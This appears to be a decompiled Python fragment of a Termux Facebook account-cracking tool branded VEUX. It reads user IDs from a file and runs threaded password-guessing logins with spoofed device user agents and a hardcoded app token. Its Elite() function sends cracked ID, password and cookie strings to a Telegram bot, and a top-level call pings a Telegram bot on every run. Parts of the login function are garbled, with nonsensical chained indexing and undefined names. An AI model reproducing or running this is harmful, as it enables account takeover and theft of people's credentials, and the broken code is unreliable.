    'SM-G935F',
    'NRD90M',
    'SM-T561',
    'KTU84P',
    'SM-T531',
    'KOT49H',
    'SM-J320FN',
    'LMY47V',
    'SM-A500F',
    'MMB29M',
    'SM-A500FU',
    'MMB29M',
    'SM-A500F',
    'MMB29M',
    'SM-T311',
    'KOT49H',
    'SM-T531',
    'LRX22G',
    'SM-J320F',
    'LMY47V',
    'SM-J320FN',
    'LMY47V',
    'SM-J320F',
    'LMY47V',
    'GT-P5210',
    'KOT49H',
    'SM-T230',
    'KOT49H',
    'GT-I9192',
    'KOT49H',
    'SM-T235',
    'KOT4',
    'GT-N7100',
    'KOT49H',
    'SM-A500F',
    'LRX22G',
    'SM-A500F',
    'MMB29M',
    'GT-N7100',
    'KOT49H',
    'SM-G920F',
    'MMB29K',
    'SM-J510FN',
    'NMF26X',
    'GT-N8000',
    'JZO54K',
    'SM-J320FN',
    'LMY47V',
    'SM-J320FN',
    'LMY47V',
    'SM-A500H',
    'MMB29M',
    'GT-I9300',
    'JSS15J',
    'GT-I9500',
    'LRX22C',
    'SM-J320F',
    'LMY4',
    'SM-J510FN',
    'NMF26X',
    'SM-A500F',
    'MMB29M',
    'GT-N8000',
    'KOT49H',
    'SM-T561',
    'KTU84P',
    'SM-G900F',
    'KOT49H',
    'GT-S7390',
    'JZO54K',
    'SM-J320F',
    'LMY47V',
    'GT-P5100',
    'JZO54K',
    'SM-A500FU',
    'MMB29M',
    'SM-G930F',
    'NRD90M',
    'SM-J510FN',
    'NMF26X',
    'SM-T561',
    'KTU84P',
    'GT-N8000',
    'KOT49H',
    'SM-T531',
    'LRX22G',
    'SM-J510FN',
    'MMB29M',
    'SM-J510FN',
    'NMF26X',
    'SM-J320F',
    'LMY47V',
    'GT-P5110',
    'JDQ39',
    'GT-I9301I',
    'KOT49H',
    'SM-A500F',
    'LRX22G',
    'SM-G930F',
    'NRD90M',
    'SM-T311',
    'KOT4',
    'GT-P5200',
    'KOT49H',
    'GT-I9301I',
    'KOT49H',
    'SM-J320M',
    'LMY47V',
    'SM-T531',
    'LRX22G',
    'SM-T820',
    'NRD90M',
    'GT-I9192',
    'KOT49H',
    'SM-G935F',
    'MMB29K',
    'SM-J701F',
    'NRD90M;',
    'GT-I9301I',
    'KOT4',
    'SM-J320FN',
    'LMY47V',
    'SM-T111',
    'JDQ39',
    'SM-A500F',
    'MMB29M',
    'SM-J510FN',
    'NMF2',
    'SM-T705',
    'LRX22G',
    'SM-G920F',
    'NRD90M',
    'GT-N5100',
    'JZO54K',
    'GT-I9300I',
    'KTU84P',
    'GT-I9300I',
    'KTU84P',
    'GT-N8000',
    'KOT49H',
    'GT-N8000',
    'KOT49H',
    'SM-A500F',
    'MMB29M',
    'GT-I9190',
    'KOT49H',
    'SM-J510FN',
    'NMF26X',
    'SM-J320F',
    'LMY47V',
    'GT-P5100',
    'JDQ39',
    'GT-I9300I',
    'KTU84P',
    'GT-N5100',
    'JZO54K',
    'GT-N8000',
    'KOT49H',
    'GT-I9500',
    'LRX22C',
    'SM-J320FN',
    'LMY47V',
    'SM-A500F',
    'MMB29M',
    'GT-N8000',
    'JZO54K',
    'SM-T805',
    'LRX22G',
    'SM-T231',
    'KOT49H',
    'GT-N5100',
    'JZO54K',
    'SM-J320H',
    'LMY47V',
    'SM-T231',
    'KOT49H',
    'SM-G930F',
    'NRD90M',
    'SM-G935F',
    'NRD90M',
    'SM-T310',
    'KOT49H',
    'GT-N8000',
    'KOT49H',
    'GT-I9300I',
    'KTU84P',
    'SM-G920F',
    'NRD90M',
    'SM-J510FN',
    'NMF26X',
    'SM-T705',
    'LRX22G;',
    'GT-P3110',
    'JZO54K',
    'GT-I9192',
    'KOT49H',
    'SM-J320F',
    'LMY47V',
    'SM-G920F',
    'NRD90M',
    'GT-I9300',
    'IMM76D',
    'SM-G950F',
    'NRD90M',
    'SM-J320F',
    'LMY47V',
    'SM-J510FN',
    'NMF26X;',
    'SM-J701F',
    'NRD90M',
    'SM-A500F',
    'LRX22G',
    'SM-T231',
    'KOT49H',
    'SM-T311',
    'KOT49H',
    'SM-J320FN',
    'LMY47V',
    'GT-P5210',
    'KOT49H',
    'SM-T805',
    'LRX22G',
    'GT-I9500',
    'LRX22C',
    'GT-P5200',
    'KOT49H',
    'GT-I9301I',
    'KOT49H',
    'GT-I9300',
    'JSS15J',
    'GT-N7100',
    'KOT49H',
    'SM-T531',
    'LRX22G',
    'SM-T820',
    'NRD90M',
    'SM-T315',
    'JDQ39',
    'SM-J320F',
    'LMY47V',
    'GT-I9190',
    'KOT49H',
    'GT-P5220',
    'JDQ39',
    'SM-T525',
    'KOT49H',
    'SM-T555',
    'LRX22G',
    'GT-I9190',
    'KOT49H',
    'SM-J510FN',
    'NMF26X;',
    'SM-A500F',
    'MMB29M',
    'GT-I9192',
    'KOT49H',
    'GT-P5100',
    'JDQ',
    'SM-T311',
    'KOT49H'])
token = ''
ID = ''
message = 'يبدو ان احدهم يستعمل👣 Veux  0.1'
requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}''')
realme = "RMX3516','RMX3371','RMX3461','RMX3286','RMX3561','RMX3388','RMX3311','RMX3142','RMX2071','RMX1805','RMX1809','RMX1801','RMX1807','RMX1803','RMX1825','RMX1821','RMX1822','RMX1833','RMX1851','RMX1853','RMX1827','RMX1911','RMX1919','RMX1927','RMX1971','RMX1973','RMX2030','RMX2032','RMX1925','RMX1929','RMX2001','RMX2061','RMX2063','RMX2040','RMX2042','RMX2002','RMX2151','RMX2163','RMX2155','RMX2170','RMX2103','RMX3085','RMX3241','RMX3081','RMX3151','RMX3381','RMX3521','RMX3474','RMX3471','RMX3472','RMX3392','RMX3393','RMX3491','RMX1811','RMX2185','RMX3231','RMX2189','RMX2180','RMX2195','RMX2101','RMX1941','RMX1945','RMX3063','RMX3061','RMX3201','RMX3203','RMX3261','RMX3263','RMX3193','RMX3191','RMX3195','RMX3197','RMX3265','RMX3268','RMX3269','RMX2027','RMX2020','RMX2021','RMX3581','RMX3501','RMX3503','RMX3511','RMX3310','RMX3312','RMX3551','RMX3301','RMX3300','RMX2202','RMX3363','RMX3360','RMX3366','RMX3361','RMX3031','RMX3370','RMX3357','RMX3560','RMX3562','RMX3350','RMX2193','RMX2161','RMX2050','RMX2156','RMX3242','RMX3171','RMX3430','RMX3235','RMX3506','RMX2117','RMX2173','RMX3161','RMX2205','RMX3462','RMX3478','RMX3372','RMX3574','RMX1831','RMX3121','RMX3122','RMX3125','RMX3043','RMX3042','RMX3041','RMX3092','RMX3093','RMX3571','RMX3475','RMX2200','RMX2201','RMX2111','RMX2112','RMX1901','RMX1903','RMX1992','RMX1993','RMX1991','RMX1931','RMX2142','RMX2081','RMX2085','RMX2083','RMX2086','RMX2144','RMX2051','RMX2025','RMX2075','RMX2076','RMX2072','RMX2052','RMX2176','RMX2121','RMX3115','RMX1921"
infinix = "X676B','X687','X609','X697','X680D','X507','X605','X668','X6815B','X624','X655F','X689C','X608','X698','X682B','X682C','X688C','X688B','X658E','X659B','X689B','X689','X689D','X662','X662B','X675','X6812B','X6812','X6817B','X6817','X6816C','X6816','X6816D','X668C','X665B','X665E','X510','X559C','X559F','X559','X606','X606C','X606D','X623','X624B','X625C','X625D','X625B','X650D','X650B','X650','X650C','X655C','X655D','X680B','X573','X573B','X622','X693','X695C','X695D','X695','X663B','X663','X670','X671','X671B','X672','X6819','X572','X572-LTE','X571','X604','X610B','X690','X690B','X656','X692','X683','X450','X5010','X501','X401','X626','X626B','X652','X652A','X652B','X652C','X660B','X660C','X660','X5515','X5515F','X5515I','X609B','X5514D','X5516B','X5516C','X627','X680','X653','X653C','X657','X657B','X657C','X6511B','X6511E','X6511','X6512','X6823C','X612B','X612','X503','X511','X352','X351','X530','X676C','X6821','X6823','X6827','X509','X603','X6815','X620B','X620','X687B','X6811B','X6810','X6811"
import os
import time
time.sleep(1.5)
os.system('clear')
print('\x1b[1;32m TOOL IS OPENING   ⌛⌛VEUX')
loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
uid = []
plist = []
user = []
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

def clear():
    os.system('clear')
    print(logo)


def mn():
    print(f'''{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤ ''')


def xx():
    oppo = random.choice([
        'CNM632',
        'CPH1114',
        'CPH1235',
        'CPH1451',
        'CPH1615',
        'CPH1664',
        'CPH1869',
        'CPH1929',
        'CPH1985',
        'CPH2048',
        'CPH2107',
        'CPH2238',
        'CPH2261',
        'CPH2331',
        'CPH2332',
        'CPH2351',
        'CPH2389',
        'CPH2451',
        'CPH2491',
        'CPH2513',
        'CPH2515',
        'CPH2519',
        'CPH2521',
        'CPH2523',
        'CPH2525',
        'CPH2529',
        'CPH2551',
        'CPH2569',
        'CPH2579',
        'CPH2589',
        'CPH2591',
        'CPH2643',
        'CPH3475',
        'CPH3669',
        'CPH3682',
        'CPH3731',
        'CPH3776',
        'CPH3785',
        'CPH4125',
        'CPH4275',
        'CPH4299',
        'CPH4395',
        'CPH4473',
        'CPH4987',
        'CPH5286',
        'CPH5841',
        'CPH5947',
        'CPH6178',
        'CPH6244',
        'CPH6271',
        'CPH6316',
        'CPH6519',
        'CPH6528',
        'CPH6697',
        'CPH7338',
        'CPH7364',
        'CPH7382',
        'CPH7532',
        'CPH7577',
        'CPH7948',
        'CPH7991',
        'CPH8153',
        'CPH8346',
        'CPH8347',
        'CPH8363',
        'CPH8393',
        'CPH8467',
        'CPH8472',
        'CPH8534',
        'CPH8686',
        'CPH8893',
        'CPH9177',
        'CPH9226',
        'CPH9659',
        'CPH9667',
        'CPH9716',
        'CPH9763',
        'CPH9839',
        'CPH9929'])
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(444, 999)) + '.0.0.' + str(random.randint(4444, 9999)) + 'Davik/2.1.0 (Linux; U; Android 12; SM-M315F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/319.0.0.8.43;FBPN/com.facebook.orca;FBLC/fa_IR;FBBV/739506456;FBCR/Djezzy;FBMF/samsung;FBBD/samsung;FBDV/SM-M315F;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;] Davik/2.1.0 (Linux; U; Android 12; SM-M315F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/311.0.0.8.87;FBPN/com.facebook.katana;FBLC/ar_DZ;FBBV/512425733;FBCR/Djezzy;FBMF/samsung;FBBD/samsung;FBDV/SM-M315F;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;]'
    return ua


def cek_apk(session, coki):
    active_url = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
    response = session.get(active_url, cookies = {
        'cookie': coki })
    response.raise_for_status()
    sop = BeautifulSoup(response.text, 'html.parser')
    form = sop.find('form', method = 'post')
    games = form.find_all('h3')
    if not games:
        print('\r\x1b[38;5;46m [\x1b[38;5;196m!\x1b[38;5;46m] \x1b[1;33mSorry there is no Active Apk')
    print('\r [ðŸŽ®] \x1b[38;5;46m â˜† Your Active Apps â˜†     :')
    for i, game in enumerate(games, 1):
        print(f'''\r [{i}] {game.text.replace('Added on', ' Added on')}''')
        inactive_url = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive'
        response = session.get(inactive_url, cookies = {
            'cookie': coki })
        response.raise_for_status()
        sop = BeautifulSoup(response.text, 'html.parser')
        form = sop.find('form', method = 'post')
        games = form.find_all('h3')
        if not games:
            print('\r\x1b[38;5;46m [\x1b[38;5;196m!\x1b[38;5;46m] \x1b[1;33mSorry there is no Expired Apk')
    print('\r [ðŸŽ®] \x1b[38;5;196m â—‡ Your Expired Apps â—‡    :')
    for i, game in enumerate(games, 1):
        print(f'''\r [{i}] {game.text.replace('Expired', ' Expired')}''')
        print('\x1b[97;1m------------------------------------------------')
        return None
        return None


def Elite(id, ps, coki):
    import requests
    token = ''
    chatid = ''
    ok_id = str(id + '|' + ps + '|' + coki)
    url = f'''https://api.telegram.org/bot{token}/sendMessage'''
    params = {
        'chat_id': chatid,
        'text': ok_id }
    requests.get(url, params = params)
    return None

import os
oppo = "CPH1869','CPH1929','CPH2107','CPH2238','CPH2389','CPH2401','CPH2407','CPH2413','CPH2415','CPH2417','CPH2419','CPH2455','CPH2459','CPH2461','CPH2471','CPH2473','CPH2477','CPH8893','CPH2321','CPH2341','CPH2373','CPH2083','CPH2071','CPH2077','CPH2185','CPH2179','CPH2269','CPH2421','CPH2349','CPH2271','CPH1923','CPH1925','CPH1837','CPH2015','CPH2073','CPH2081','CPH2029','CPH2031','CPH2137','CPH1605','CPH1803','CPH1853','CPH1805','CPH1809','CPH1851','CPH1931','CPH1959','CPH1933','CPH1935','CPH1943','CPH2061','CPH2069','CPH2127','CPH2131','CPH2139','CPH2135','CPH2239','CPH2195','CPH2273','CPH2325','CPH2309','CPH1701','CPH2387','CPH1909','CPH1920','CPH1912','CPH1901','CPH1903','CPH1905','CPH1717','CPH1801','CPH2067','CPH2099','CPH2161','CPH2219','CPH2197','CPH2263','CPH2375','CPH2339','CPH1715','CPH2385','CPH1729','CPH1827','CPH1938','CPH1937','CPH1939','CPH1941','CPH2001','CPH2021','CPH2059','CPH2121','CPH2123','CPH2203','CPH2333','CPH2365','CPH1913','CPH1911','CPH1915','CPH1969','CPH2209','CPH1987','CPH2095','CPH2119','CPH2285','CPH2213','CPH2223','CPH2363','CPH1609','CPH1613','CPH1723','CPH1727','CPH1725','CPH1819','CPH1821','CPH1825','CPH1881','CPH1823','CPH1871','CPH1875','CPH2023','CPH2005','CPH2025','CPH2207','CPH2173','CPH2307','CPH2305','CPH2337','CPH1955','CPH1707','CPH1719','CPH1721','CPH1835','CPH1831','CPH1833','CPH1879','CPH1893','CPH1877','CPH1607','CPH1611','CPH1917','CPH1919','CPH1907','CPH1989','CPH1945','CPH1951','CPH2043','CPH2035','CPH2037','CPH2036','CPH2009','CPH2013','CPH2113','CPH2091','CPH2125','CPH2109','CPH2089','CPH2065','CPH2159','CPH2145','CPH2205','CPH2201','CPH2199','CPH2217','CPH1921','CPH2211','CPH2235','CPH2251','CPH2249','CPH2247','CPH2237','CPH2371','CPH2293','CPH2353','CPH2343','CPH2359','CPH2357','CPH2457','CPH1983','CPH1979"
os.system('clear')
sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', ' ➤ \x1b[1;92m')
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
SX = '{A}({R}+{A}) {A}'
logo = f'''\n      \x1b[97;1m\n\x1b[1;31m[\x1b[1;37m=\x1b[1;31m]\x1b[1;31m>=>         >=> >=======> >=>     >=> >=>      >=> \n\x1b[1;31m[\x1b[1;37m=\x1b[1;31m]\x1b[1;37m >=>       >=>  >=>       >=>     >=>  >=>   >=>   \n\x1b[1;31m[\x1b[1;37m=\x1b[1;31m]\x1b[1;31m  >=>     >=>   >=>       >=>     >=>   >=> >=>    \n\x1b[1;31m[\x1b[1;37m=\x1b[1;31m]\x1b[1;37m   >=>   >=>    >=====>   >=>     >=>     >=>      \n\x1b[1;31m[\x1b[1;37m=\x1b[1;31m]\x1b[1;31m    >=> >=>     >=>       >=>     >=>   >=> >=>    \n\x1b[1;31m[\x1b[1;37m=\x1b[1;31m]\x1b[1;37m     >===>      >=>       >=>     >=>  >=>   >=>   \n\x1b[1;31m[\x1b[1;37m=\x1b[1;31m]\x1b[1;31m      >=>       >=======>   >====>    >=>      >=> \n\x1b[97;1m══════════════════════════════════════════════\n\x1b[1;31m[\x1b[1;31m•\x1b[1;31m] \x1b[1;37m𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : \x1b[1;37mVEN0M6\n\x1b[1;31m[\x1b[1;31m•\x1b[1;31m] \x1b[1;37m𝐆𝐈𝐓𝐇𝗨𝐁    : \x1b[1;37mVENOM\n\x1b[1;31m[\x1b[1;31m•\x1b[1;31m] \x1b[1;37m𝐒𝐓𝐀𝐓𝗨𝐒    : \x1b[1;37mFREE\n\x1b[1;31m[\x1b[1;31m•\x1b[1;31m] \x1b[1;37m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   : \x1b[1;32m0.1\n\x1b[1;31m[\x1b[1;31m•\x1b[1;31m] \x1b[1;37m𝐓𝐎𝐎𝐋      : \x1b[1;37mFILE CLONE\n{R}✦{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}✦   \n {Y}✦ {A}USER TOKEN  {R}:{G}\n{R}✦{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'''
os.system('xdg-open https://www.facebook.com/copnrt.03')
plist = []
fo = []
pcp = []
oks = []
cps = []
sim = ""
def key():
    uID = hashlib.md5(
        (platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()
    ).hexdigest()
    return uID.upper()

kfeyx = key()
print(logo)

def menu():
    clear()
    print(f"{A}({R}1{A}) {A}FILE CLONING ")
    print(f"{A}({R}0{A}) {A}EXIT ")
    mn()
    xd = input(f"{A}({R}+{A}) {A}CHOICE   {R}:{A} ")

    if xd in ('1', '01'):
        clear()
        print(f"{A}({R}+{A}) {A}EXAMPLE  {R}: {A}/sdcard/filename.txt ")
        mn()
        file = input(f"{A}({R}+{A}) {A}INPUT    {R}:{A} ")

        try:
            with open(file, 'r') as f:
                lines = f.readlines()
        except IOError:
            print(f"{A}({R}+{A}) {A}FILE LOCATION NOT FOUND ")
            time.sleep(1)
            menu()
            return
            
        clear()
        print(f"({A}1) METHOD ({A}M1)-(MIX/NEW)({A}2) METHOD ({A}M2)-(MIX/NEW)")
        mn()
        mthd = input(f"{A}({R}+{A}) {A}CHOICE : ")
        clear()
        ps_limit = int(input(f"{A}({R}1{A}) {A}PASSWORD LIMIT : "))

        clear()
        print(f"{A}({R}+{A}) {A}{R}({A}EXAMPLE{R}) {A}first last {R}~ {A}first123 {R}~ {A}01-20")
        mn()
        for i in range(ps_limit):
            plist.append(input(f"{A}({R}+{A}) {A}PASSWORD NO {i + 1} {R}: {A} "))

        clear()
        print(f"{A}({R}+{A}) {A}DO YOU WANT TO SHOW CP ACCOUNT : {R}({A}Y{R}/{A}N{R})")
        mn()
        cx = input(f"{A}({R}+{A}) CHOICE{R} :{A} ")

        if cx.lower() in ('y', 'yes', '1'):
            pcp.append('y')
        else:
            pcp.append('n')

        crack_submit = tred(max_workers=30)
        clear()
        total_ids = str(len(fo))
        print(f"{A}({R}+{A}) {A}TOTAL ACCOUNT {R}:{A} " + total_ids)
        print(f"{A}({R}+{A}) Sim : {sim}")
        print(f"{A}({R}+{A})\x1b[38;5;46m {A}TOTAL-PASS {R}:{A} {ps_limit}")
        print(f"{A}({R}+{A}) IF NO RESULT {R}[{A}ON{R}/{A}OFF{R}] {A}AIRPLANE MODE")
        print(f"{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤")

        for user in fo:
            ids, names = user.split('|')
            passlist = plist
            if mthd in ('1', '01'):
                crack_submit.submit(api1, ids, names, passlist)
            elif mthd in ('2', '02'):
                crack_submit.submit(api2, ids, names, passlist)

        print('\x1b[1;37m')
        print(f"{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤ ")
        print(f"{A}({R}+{A}) {A} THE PROCESS HAS COMPLETED")
        print(f"{A}({R}+{A}) {A} TOTAL OK/CP : " + str(len(oks)) + f"\n{A}({R}+{A}) {A} TOTAL CP : " + str(len(cps)))
        print(f"{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤ ")
        input(f"{A}({R}+{A}) {A} PRESS ENTER TO BACK ")
        menu()

    elif xd in ('0', '00'):
        exit(f"{A}({R}+{A}) {A} BAY 👋🏻 ")
    else:
        print(f"{A}({R}+{A}) {A} OPTION NOT FOUND IN")
        time.sleep(1)
        menu()

alm = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')

def api1(ids, names, passlist):
    global loop
    []['\r\r'][f'''{R}''']['('][f'''{A}''']['VEUX-XD'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['METHOD-N'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s']([]['\r\r'][f'''{R}''']['('][f'''{A}''']['VEUX-XD'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['METHOD-N'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}''']([]['\r\r'][f'''{R}''']['('][f'''{A}''']['VEUX-XD'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['METHOD-N'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') ']) % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    []['\r\r'][f'''{R}''']['('][f'''{A}''']['VEUX-XD'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['METHOD-N'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        accessToken = ('256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',)
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        en = random.choice([
            'en_US',
            'en_GB',
            'fr_FR'])
        inform = random.choice([
            'X697X663',
            'X663B',
            'PR652B',
            'X267',
            'X5010',
            'X521',
            'X5514D',
            'X5515',
            'X5515F',
            'X559',
            'X559C',
            'X559F',
            'X571',
            'X572',
            'X573',
            'X573B',
            'X601',
            'X603',
            'X604',
            'X604B',
            'X605',
            'X606',
            'X606B',
            'X606C',
            'X606D',
            'X608',
            'X609',
            'X610',
            'X610B',
            'X612',
            'X612B',
            'X620',
            'X620B',
            'X622',
            'X623',
            'X623B',
            'X624',
            'X624B',
            'X625',
            'X625B',
            'X625D',
            'X626',
            'X626B',
            'X627V',
            'X650',
            'X650B',
            'X650C',
            'X650D',
            'X652',
            'X652A',
            'X652B',
            'X652C',
            'X653',
            'X653C',
            'X655',
            'X655C',
            'X655D',
            'X655F',
            'X656',
            'X657',
            'X657B',
            'X657C',
            'X659B',
            'X660',
            'X660B',
            'X660C',
            'X680',
            'X680B',
            'X680C',
            'X682B',
            'X682C',
            'X683',
            'X687',
            'X687B',
            'X688B',
            'X688C',
            'X688C',
            'X689',
            'X689B',
            'X689C',
            'X690',
            'X690B',
            'X692',
